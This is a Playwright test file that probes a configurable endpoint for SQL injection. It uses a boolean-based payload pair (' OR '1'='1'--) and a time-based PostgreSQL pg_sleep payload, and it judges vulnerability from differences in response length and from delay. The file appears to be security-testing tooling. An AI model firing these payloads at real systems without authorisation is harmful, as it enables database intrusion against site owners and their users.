import { test, expect } from '@playwright/test';
const ENDPOINT = process.env.SQLI_ENDPOINT;
const POS = "' OR '1'='1'--";
const NEG = "' OR '1'='2'--";
const TIME = process.env.SQLI_TIME_PAYLOAD || "'; SELECT pg_sleep(4)--";
test.skip(!ENDPOINT, 'Provide SQLI_ENDPOINT');
test('Boolean-based heuristic', async ({ page }) => {
  await page.goto(ENDPOINT + encodeURIComponent(POS));
  const posLen = (await page.content()).length;
  await page.goto(ENDPOINT + encodeURIComponent(NEG));
  const negLen = (await page.content()).length;
  expect(Math.abs(posLen - negLen)).toBeGreaterThan(100);
});
test('Time-based heuristic', async ({ page }) => {
  const t0 = Date.now();
  await page.goto(ENDPOINT + encodeURIComponent(TIME));
  const dt = Date.now() - t0;
  expect(dt).toBeGreaterThan(3500);
});
